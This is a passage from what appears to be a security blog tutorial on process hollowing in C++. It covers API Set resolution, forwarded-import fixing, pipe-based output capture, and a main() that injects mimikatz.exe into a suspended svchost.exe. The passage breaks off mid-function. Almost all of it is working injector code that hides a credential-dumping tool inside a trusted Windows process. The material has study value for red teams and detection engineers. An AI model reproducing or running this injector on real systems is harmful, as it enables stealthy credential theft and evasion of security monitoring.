    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">apiMap</span><span class="o">-&gt;</span><span class="n">Count</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="c1">// -5 because we remove .dll and the last digit
</span>
        <span class="c1">// *2 because we have WCHAR
</span>
        <span class="kt">int</span> <span class="n">len</span> <span class="o">=</span> <span class="n">lstrlenW</span><span class="p">(</span><span class="n">apiToResolve</span><span class="p">)</span> <span class="o">*</span> <span class="mi">2</span> <span class="o">-</span> <span class="mi">5</span> <span class="o">*</span> <span class="mi">2</span><span class="p">;</span>
        <span class="n">ApiStrName</span> <span class="o">=</span> <span class="p">(</span><span class="n">PWSTR</span><span class="p">)((</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">apiMap</span> <span class="o">+</span> <span class="n">ApiMapEntry</span><span class="o">-&gt;</span><span class="n">NameOffset</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">memcmp</span><span class="p">(</span><span class="n">ApiStrName</span><span class="p">,</span> <span class="n">apiToResolve</span><span class="p">,</span><span class="n">len</span> <span class="p">))</span>
        <span class="p">{</span>
            <span class="n">PAPI_SET_VALUE_ENTRY</span> <span class="n">ApiValueEntry</span> <span class="o">=</span> <span class="p">(</span><span class="n">PAPI_SET_VALUE_ENTRY</span><span class="p">)((</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">apiMap</span> <span class="o">+</span> <span class="n">ApiMapEntry</span><span class="o">-&gt;</span><span class="n">ValueOffset</span><span class="p">);</span>
            <span class="n">apiResolved</span> <span class="o">=</span> <span class="p">(</span><span class="n">PWCHAR</span><span class="p">)</span><span class="n">LocalAlloc</span><span class="p">(</span><span class="n">LPTR</span><span class="p">,</span> <span class="n">ApiValueEntry</span><span class="o">-&gt;</span><span class="n">ValueLength</span> <span class="o">+</span> <span class="mi">2</span><span class="p">);</span>
            <span class="n">memcpy</span><span class="p">(</span><span class="n">apiResolved</span><span class="p">,</span> <span class="p">(</span><span class="n">PWSTR</span><span class="p">)((</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">apiMap</span> <span class="o">+</span> <span class="n">ApiValueEntry</span><span class="o">-&gt;</span><span class="n">ValueOffset</span><span class="p">),</span> <span class="n">ApiValueEntry</span><span class="o">-&gt;</span><span class="n">ValueLength</span><span class="p">);</span>

            <span class="n">_dbg</span><span class="p">(</span><span class="s">"ApiSetName: %ws -&gt; ApiResolved: %ws </span><span class="se">\r\n</span><span class="s">"</span><span class="p">,</span> <span class="n">apiToResolve</span><span class="p">,</span> <span class="n">apiResolved</span><span class="p">);</span> 
            <span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="n">ApiMapEntry</span><span class="o">++</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">_err</span><span class="p">(</span><span class="s">"Error in resolving API Set name: %ws </span><span class="se">\r\n</span><span class="s">"</span><span class="p">,</span> <span class="n">apiToResolve</span><span class="p">);</span>
    <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
<span class="p">}</span></code></pre></figure>

<p>Now let’s modify our function <code class="language-plaintext highlighter-rouge">fixImports</code>:</p>

<figure class="highlight"><pre><code class="language-c--" data-lang="c++"><span class="kt">bool</span> <span class="nf">fixImports</span><span class="p">(</span><span class="n">LPVOID</span> <span class="n">pImage</span><span class="p">,</span> <span class="n">PIMAGE_NT_HEADERS64</span> <span class="n">ntHeaders</span><span class="p">,</span> <span class="n">LPPROCESS_INFORMATION</span> <span class="n">pi</span><span class="p">,</span> <span class="n">PVOID</span> <span class="n">allocAddrOnTarget</span><span class="p">,</span> <span class="n">DWORD</span> <span class="n">offsetRdata</span><span class="p">,</span> <span class="n">HANDLE</span> <span class="n">mod</span><span class="p">)</span>
<span class="p">{</span>
    <span class="p">...</span>
                    <span class="k">if</span> <span class="p">(</span><span class="n">forwardedLib</span> <span class="o">&amp;&amp;</span> <span class="n">forwardedName</span><span class="p">)</span>
                    <span class="p">{</span>

                        <span class="n">PWSTR</span> <span class="n">forwardedLibWstr</span> <span class="o">=</span> <span class="n">strToWstr</span><span class="p">(</span><span class="n">forwardedLib</span><span class="p">);</span>

                        <span class="n">MODULEENTRY32W</span> <span class="n">fwMe32</span> <span class="o">=</span> <span class="n">getModuleEntry</span><span class="p">(</span><span class="n">mod</span><span class="p">,</span> <span class="n">forwardedLibWstr</span><span class="p">);</span>
                        <span class="k">if</span> <span class="p">(</span><span class="n">fwMe32</span><span class="p">.</span><span class="n">modBaseAddr</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
                        <span class="p">{</span>
                            <span class="n">PWSTR</span> <span class="n">apiSetResolved</span> <span class="o">=</span> <span class="nb">nullptr</span><span class="p">;</span>
                            <span class="n">resolveAPISet</span><span class="p">(</span><span class="n">forwardedLibWstr</span><span class="p">,</span> <span class="n">apiSetResolved</span><span class="p">);</span>
                            <span class="n">fwMe32</span> <span class="o">=</span> <span class="n">getModuleEntry</span><span class="p">(</span><span class="n">mod</span><span class="p">,</span> <span class="n">apiSetResolved</span><span class="p">);</span>
                            <span class="k">if</span> <span class="p">(</span><span class="n">fwMe32</span><span class="p">.</span><span class="n">modBaseAddr</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
                            <span class="p">{</span>
                                <span class="n">_err</span><span class="p">(</span><span class="s">"Error in resolving the forwarded lib %ws</span><span class="se">\r\n</span><span class="s">"</span><span class="p">,</span> <span class="n">forwardedLibWstr</span><span class="p">);</span>
                                <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
                            <span class="p">}</span>
                        <span class="p">}</span>

                        <span class="n">HMODULE</span> <span class="n">fwLib</span> <span class="o">=</span> <span class="n">LoadLibraryA</span><span class="p">(</span><span class="n">forwardedLib</span><span class="p">);</span>
                        <span class="n">offset</span> <span class="o">=</span> <span class="p">(</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">addrFunc</span> <span class="o">-</span> <span class="p">(</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">fwLib</span><span class="p">;</span>
                        <span class="n">addrFix</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="p">)((</span><span class="n">PBYTE</span><span class="p">)</span><span class="n">fwMe32</span><span class="p">.</span><span class="n">modBaseAddr</span> <span class="o">+</span> <span class="n">offset</span><span class="p">);</span>
                        <span class="n">_dbg</span><span class="p">(</span><span class="s">"[FORWARDED FUNCTION] %s is a forwarded function in %ws @ 0x%p</span><span class="se">\r\n</span><span class="s">"</span><span class="p">,</span> <span class="n">functionName</span><span class="o">-&gt;</span><span class="n">Name</span><span class="p">,</span> <span class="n">fwMe32</span><span class="p">.</span><span class="n">szModule</span><span class="p">,</span> <span class="n">fwMe32</span><span class="p">.</span><span class="n">modBaseAddr</span><span class="p">);</span>
                    <span class="p">}</span>
    <span class="p">...</span>
<span class="p">}</span></code></pre></figure>

<p>Let’s find out if our mimikatz successfuly works. To test, we will change slightly the function <code class="language-plaintext highlighter-rouge">launchSuspendedProcess</code>, to pass arguments to the command line. We will attempt to create a log file with mimikatz and execute the commands <code class="language-plaintext highlighter-rouge">coffee</code> and <code class="language-plaintext highlighter-rouge">exit</code>.</p>

<figure class="highlight"><pre><code class="language-c--" data-lang="c++"><span class="kt">bool</span> <span class="nf">launchSusprendedProcess</span><span class="p">(</span><span class="n">LPSTR</span> <span class="n">processName</span><span class="p">,</span> <span class="n">LPPROCESS_INFORMATION</span><span class="o">&amp;</span> <span class="n">pi</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">STARTUPINFOA</span> <span class="n">si</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">CreateProcessA</span><span class="p">(</span><span class="n">processName</span><span class="p">,</span> <span class="p">(</span><span class="n">PCHAR</span><span class="p">)</span><span class="s">"C:</span><span class="se">\\</span><span class="s">Windows</span><span class="se">\\</span><span class="s">System32</span><span class="se">\\</span><span class="s">svchost.exe </span><span class="se">\"</span><span class="s">log C:</span><span class="se">\\</span><span class="s">Temp</span><span class="se">\\</span><span class="s">test.log</span><span class="se">\"</span><span class="s"> </span><span class="se">\"</span><span class="s">coffee</span><span class="se">\"</span><span class="s"> </span><span class="se">\"</span><span class="s">exit</span><span class="se">\"</span><span class="s">"</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">TRUE</span><span class="p">,</span> <span class="n">CREATE_SUSPENDED</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">si</span><span class="p">,</span> <span class="n">pi</span><span class="p">))</span>
    <span class="p">{</span>
        <span class="n">_err</span><span class="p">(</span><span class="s">"[-] ERROR: Cannot create process %s"</span><span class="p">,</span> <span class="n">processName</span><span class="p">);</span>
        <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">_dbg</span><span class="p">(</span><span class="s">"[+] Launching process %s with PID: %d</span><span class="se">\r\n</span><span class="s">"</span><span class="p">,</span> <span class="n">processName</span><span class="p">,</span> <span class="n">pi</span><span class="o">-&gt;</span><span class="n">dwProcessId</span><span class="p">);</span>
    <span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>
<span class="p">}</span></code></pre></figure>

<p><img src="assets/img/posts/20240124/PHMimi.png" alt="Execution of mimikatz" /></p>

<p>Now we have a fully functionnal code that allows us to execute any PE through process hollowing technic. But, we would like now to retrieve the output directly in our program.</p>

<h2 id="final-touch-retrieve-output-of-our-injected-process">Final Touch: Retrieve output of our injected process</h2>

<p>Windows created <code class="language-plaintext highlighter-rouge">pipes</code> which is a mechanism used to create interprocess communication. Therefore, we can redirect <code class="language-plaintext highlighter-rouge">stdOut</code> and <code class="language-plaintext highlighter-rouge">stdErr</code> to the created anonymous pipe and then read it.<br />
First we will modify our <code class="language-plaintext highlighter-rouge">launchSuspendedProcess</code>.</p>

<figure class="highlight"><pre><code class="language-c--" data-lang="c++"><span class="n">BOOL</span> <span class="nf">launchSusprendedProcess</span><span class="p">(</span><span class="n">LPSTR</span> <span class="n">processName</span><span class="p">,</span> <span class="n">LPPROCESS_INFORMATION</span><span class="o">&amp;</span> <span class="n">pi</span><span class="p">,</span> <span class="n">PCHAR</span> <span class="n">args</span><span class="p">,</span> <span class="n">HANDLE</span><span class="o">&amp;</span> <span class="n">hStdOutPipeRead</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">HANDLE</span> <span class="n">hStdOutPipeWrite</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
    <span class="n">SECURITY_ATTRIBUTES</span> <span class="n">sa</span> <span class="o">=</span> <span class="p">{</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">SECURITY_ATTRIBUTES</span><span class="p">),</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">TRUE</span> <span class="p">};</span>
    <span class="n">STARTUPINFOA</span> <span class="n">si</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>

    <span class="c1">//Creating Pipe for output of exe
</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">CreatePipe</span><span class="p">(</span><span class="o">&amp;</span><span class="n">hStdOutPipeRead</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">hStdOutPipeWrite</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">sa</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span>
    <span class="p">{</span>
        <span class="n">_err</span><span class="p">(</span><span class="s">"[CMD] Failed Output pipe"</span><span class="p">);</span>
        <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="c1">// Redirection STDOUT/STDERR into pipe
</span>
    <span class="n">si</span><span class="p">.</span><span class="n">cb</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">STARTUPINFOA</span><span class="p">);</span>
    <span class="n">si</span><span class="p">.</span><span class="n">dwFlags</span> <span class="o">=</span> <span class="n">STARTF_USESTDHANDLES</span><span class="p">;</span>
    <span class="n">si</span><span class="p">.</span><span class="n">hStdError</span> <span class="o">=</span> <span class="n">hStdOutPipeWrite</span><span class="p">;</span>
    <span class="n">si</span><span class="p">.</span><span class="n">hStdOutput</span> <span class="o">=</span> <span class="n">hStdOutPipeWrite</span><span class="p">;</span>
    <span class="n">PCHAR</span> <span class="n">cmdLine</span> <span class="o">=</span> <span class="n">strConcat</span><span class="p">(</span><span class="n">processName</span><span class="p">,</span> <span class="n">args</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">CreateProcessA</span><span class="p">(</span><span class="n">processName</span><span class="p">,</span> <span class="n">cmdLine</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">TRUE</span><span class="p">,</span> <span class="n">CREATE_SUSPENDED</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">si</span><span class="p">,</span> <span class="n">pi</span><span class="p">))</span>
    <span class="p">{</span>
        <span class="n">_err</span><span class="p">(</span><span class="s">"[-] ERROR: Cannot create process %s"</span><span class="p">,</span> <span class="n">processName</span><span class="p">);</span>
        <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">_dbg</span><span class="p">(</span><span class="s">"[+] Launching process %s with PID: %d</span><span class="se">\r\n</span><span class="s">"</span><span class="p">,</span> <span class="n">processName</span><span class="p">,</span> <span class="n">pi</span><span class="o">-&gt;</span><span class="n">dwProcessId</span><span class="p">);</span>
    <span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>
<span class="p">}</span></code></pre></figure>

<p>Note that we have created a function used to create a cmdLine by concatenating the process name and the arguments.</p>

<figure class="highlight"><pre><code class="language-c--" data-lang="c++"><span class="n">PCHAR</span> <span class="nf">strConcat</span><span class="p">(</span><span class="n">PCHAR</span> <span class="n">str1</span><span class="p">,</span> <span class="n">PCHAR</span> <span class="n">str2</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">SIZE_T</span> <span class="n">size1</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">str1</span><span class="p">);</span>
    <span class="n">SIZE_T</span> <span class="n">size2</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">str2</span><span class="p">);</span>
    <span class="n">PCHAR</span> <span class="n">out</span> <span class="o">=</span> <span class="p">(</span><span class="n">PCHAR</span><span class="p">)</span><span class="n">LocalAlloc</span><span class="p">(</span><span class="n">LPTR</span><span class="p">,</span> <span class="n">size1</span> <span class="o">+</span> <span class="n">size2</span> <span class="o">+</span> <span class="mi">2</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">out</span><span class="p">)</span>
        <span class="k">return</span> <span class="nb">nullptr</span><span class="p">;</span>
    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">size1</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">out</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">str1</span><span class="p">[</span><span class="n">i</span><span class="p">];</span> 
    <span class="p">}</span>
    <span class="n">out</span><span class="p">[</span><span class="n">size1</span><span class="p">]</span> <span class="o">=</span> <span class="sc">' '</span><span class="p">;</span>
    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">size2</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">out</span><span class="p">[</span><span class="n">i</span> <span class="o">+</span> <span class="n">size1</span> <span class="o">+</span> <span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">str2</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="n">out</span><span class="p">;</span>
<span class="p">}</span></code></pre></figure>

<p>Now our function will create a pipe and redirect the output to it.<br />
And then to retrieve the output we will create two functions. One to read from the pipe</p>

<figure class="highlight"><pre><code class="language-c--" data-lang="c++"><span class="kt">bool</span> <span class="nf">readPipe</span><span class="p">(</span><span class="n">HANDLE</span> <span class="n">hPipe</span><span class="p">,</span> <span class="n">PVOID</span><span class="o">*</span> <span class="n">data</span><span class="p">,</span> <span class="n">PDWORD</span> <span class="n">dataLen</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">DWORD</span> <span class="n">bytesSize</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

    <span class="c1">// first get the size then parse
</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">PeekNamedPipe</span><span class="p">(</span><span class="n">hPipe</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">bytesSize</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">))</span>
    <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">bytesSize</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="n">_dbg</span><span class="p">(</span><span class="s">"[SMB] BytesSize =&gt; %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">bytesSize</span><span class="p">);</span>
                
            <span class="o">*</span><span class="n">data</span> <span class="o">=</span> <span class="n">LocalAlloc</span><span class="p">(</span><span class="n">LPTR</span><span class="p">,</span> <span class="n">bytesSize</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
            <span class="n">memset</span><span class="p">(</span><span class="o">*</span><span class="n">data</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">bytesSize</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>

            <span class="k">if</span> <span class="p">(</span><span class="n">ReadFile</span><span class="p">(</span><span class="n">hPipe</span><span class="p">,</span> <span class="o">*</span><span class="n">data</span><span class="p">,</span> <span class="n">bytesSize</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">bytesSize</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">))</span>
            <span class="p">{</span>
                <span class="n">_dbg</span><span class="p">(</span><span class="s">"[SMB] BytesSize Read =&gt; %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">bytesSize</span><span class="p">);</span>

            <span class="p">}</span>
            <span class="k">else</span>
            <span class="p">{</span>
                <span class="n">_err</span><span class="p">(</span><span class="s">"[SMB] ReadFile: Failed[%d]</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
                <span class="n">DATA_FREE</span><span class="p">(</span><span class="o">*</span><span class="n">data</span><span class="p">,</span> <span class="n">bytesSize</span><span class="p">);</span>
                <span class="n">CloseHandle</span><span class="p">(</span><span class="n">hPipe</span><span class="p">);</span>
                <span class="k">return</span> <span class="nb">false</span><span class="p">;</span>
            <span class="p">}</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">else</span>
    <span class="p">{</span>
        <span class="n">_err</span><span class="p">(</span><span class="s">"[SMB] PeekNamedPipe: Failed[%d]</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
        <span class="n">CloseHandle</span><span class="p">(</span><span class="n">hPipe</span><span class="p">);</span>
        <span class="k">return</span> <span class="nb">false</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span></code></pre></figure>

<p>And an other that will read fragments of the output until the remote thread finished</p>

<figure class="highlight"><pre><code class="language-c--" data-lang="c++"><span class="n">VOID</span> <span class="nf">retrieveOutput</span><span class="p">(</span><span class="n">HANDLE</span> <span class="n">hThread</span><span class="p">,</span> <span class="n">HANDLE</span> <span class="n">hStdOut</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">PVOID</span> <span class="n">commandOutput</span> <span class="o">=</span> <span class="nb">nullptr</span><span class="p">;</span>
    <span class="n">DWORD</span> <span class="n">bytesSize</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="k">while</span> <span class="p">(</span><span class="n">WaitForSingleObject</span><span class="p">(</span><span class="n">hThread</span><span class="p">,</span> <span class="mi">100</span><span class="p">)</span> <span class="o">!=</span> <span class="n">WAIT_OBJECT_0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">readPipe</span><span class="p">(</span><span class="n">hStdOut</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">commandOutput</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">bytesSize</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">bytesSize</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="n">printf</span><span class="p">(</span><span class="s">"%s</span><span class="se">\r\n</span><span class="s">"</span><span class="p">,</span> <span class="n">commandOutput</span><span class="p">);</span>
            <span class="n">DATA_FREE</span><span class="p">(</span><span class="n">commandOutput</span><span class="p">,</span> <span class="n">bytesSize</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="c1">// Reading output one last time to check we don't leave anything behind...
</span>
    <span class="n">readPipe</span><span class="p">(</span><span class="n">hStdOut</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">commandOutput</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">bytesSize</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">bytesSize</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"%s</span><span class="se">\r\n</span><span class="s">"</span><span class="p">,</span> <span class="n">commandOutput</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span></code></pre></figure>

<p>Let’s try it now with this main function</p>

<figure class="highlight"><pre><code class="language-c--" data-lang="c++"><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">**</span> <span class="n">argv</span><span class="p">)</span>
<span class="p">{</span>

    <span class="n">PIMAGE_NT_HEADERS64</span> <span class="n">peInjectNtHeaders</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
    <span class="n">LPPROCESS_INFORMATION</span> <span class="n">pi</span> <span class="o">=</span> <span class="k">new</span> <span class="n">PROCESS_INFORMATION</span><span class="p">();</span>

    <span class="n">PCHAR</span> <span class="n">args</span> <span class="o">=</span> <span class="p">(</span><span class="n">PCHAR</span><span class="p">)</span><span class="s">"coffee exit"</span><span class="p">;</span>
    <span class="n">LPCSTR</span> <span class="n">peInject</span> <span class="o">=</span> <span class="s">"C:</span><span class="se">\\</span><span class="s">Users</span><span class="se">\\</span><span class="s">user</span><span class="se">\\</span><span class="s">Downloads</span><span class="se">\\</span><span class="s">mimikatz_trunk</span><span class="se">\\</span><span class="s">x64</span><span class="se">\\</span><span class="s">mimikatz.exe"</span><span class="p">;</span>
    <span class="n">LPCSTR</span> <span class="n">target</span> <span class="o">=</span> <span class="s">"C:</span><span class="se">\\</span><span class="s">Windows</span><span class="se">\\</span><span class="s">System32</span><span class="se">\\</span><span class="s">svchost.exe"</span><span class="p">;</span>

    <span class="n">LPVOID</span> <span class="n">peToInjectContent</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
    <span class="n">DWORD</span> <span class="n">peSize</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    
    <span class="n">HANDLE</span> <span class="n">hStdOut</span> <span class="o">=</span> <span class="nb">nullptr</span><span class="p">;</span>

    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">loadPEFromDisk</span><span class="p">(</span><span class="n">peInject</span><span class="p">,</span> <span class="n">peToInjectContent</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">peSize</span><span class="p">))</span>
        <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">launchSusprendedProcess</span><span class="p">((</span><span class="n">LPSTR</span><span class="p">)</span><span class="n">target</span><span class="p">,</span> <span class="n">pi</span><span class="p">,</span> <span class="n">args</span><span class="p">,</span> <span class="n">hStdOut</span><span class="p">))</span>
        <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">retrieveNtHeaders</span><span class="p">(</span><span class="n">peInjectNtHeaders</span><span class="p">,</span> <span class="n">peToInjectContent</span><span class="p">))</span>
        <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>

    <span class="n">LPVOID</span> <span class="n">allocAddrOnTarget</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
    <span class="n">allocAddrOnTarget</span> <span class="o">=</span> <span class="n">VirtualAllocEx</span><span class="p">(</span><span class="n">pi</span><span class="o">-&gt;</span><span class="n">hProcess</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">peInjectNtHeaders</span><span class="o">-&gt;</span><span class="n">OptionalHeader</span><span class="p">.</span><span class="n">SizeOfImage</span><span class="p">,</span> <span class="n">MEM_COMMIT</span> <span class="o">|</span> <span class="n">MEM_RESERVE</span><span class="p">,</span> <span class="n">PAGE_READWRITE</span><span class="p">);</span>
    <span class="n">DWORD64</span> <span class="n">DeltaImageBase</span> <span class="o">=</span> <span class="p">(</span><span class="n">DWORD64</span><span class="p">)</span><span class="n">allocAddrOnTarget</span> <span class="o">-</span> <span class="n">peInjectNtHeaders</span><span class="o">-&gt;</span><span class="n">OptionalHeader</span><span class="p">.</span><span class="n">ImageBase</span><span class="p">;</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">allocAddrOnTarget</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">_dbg</span><span class="p">(</span><span class="s">"[-] ERROR: Failed to allocate memory on target process</span><span class="se">\r\n</span><span class="s">"</span><span class="p">);</span>
        <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="n">_dbg</span><span class="p">(</span><span class="s">"[+] Memory allocate at : 0x%p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">allocAddrOnTarget</span><span class="p">);</span>

    <span class="n">IMAGE_DATA_DIRECTORY</span> <span class="n">relocationTable</span> <span class="o">=</span> <span class="n">peInjectNtHeaders</span><span class="o">-&gt;</span><span class="n">OptionalHeader</span><span class="p">.</span><span class="n">DataDirectory</span><span class="p">[</span><span class="n">IMAGE_DIRECTORY_ENTRY_BASERELOC</span><span class="p">];</span>
    <span class="n">PIMAGE_SECTION_HEADER</span> <span class="n">peToInjectRelocSection</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>

    <span class="n">DWORD</span> <span class="n">offsetRdata</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">copyPEinTargetProcess</span><span class="p">(</span><span class="n">pi</span><span class="o">-&gt;</span><span class="n">hProcess</span><span class="p">,</span> <span class="n">allocAddrOnTarget</span><span class="p">,</span> <span class="n">peToInjectContent</span><span class="p">,</span> <span class="n">peInjectNtHeaders</span><span class="p">,</span> <span class="n">peToInjectRelocSection</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">offsetRdata</span><span class="p">))</span>
        <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">fixRelocTable</span><span class="p">(</span><span class="n">pi</span><span class="o">-&gt;</span><span class="n">hProcess</span><span class="p">,</span> <span class="n">peToInjectRelocSection</span><span class="p">,</span> <span class="n">allocAddrOnTarget</span><span class="p">,</span> <span class="n">peToInjectContent</span><span class="p">,</span> <span class="n">DeltaImageBase</span><span class="p">,</span> <span class="n">relocationTable</span><span class="p">))</span>
        <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">loadImportTableLibs</span><span class="p">(</span><span class="n">peToInjectContent</span><span class="p">,</span> <span class="n">peInjectNtHeaders</span><span class="p">,</span> <span class="n">pi</span><span class="p">,</span> <span class="n">allocAddrOnTarget</span><span class="p">,</span> <span class="n">offsetRdata</span><span class="p">))</span>
        <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>


    <span class="n">HANDLE</span> <span class="n">mod</span> <span class="o">=</span> <span class="n">getSnapShotProcess</span><span class="p">(</span><span class="n">pi</span><span class="o">-&gt;</span><span class="n">dwProcessId</span><span class="p">);</span>

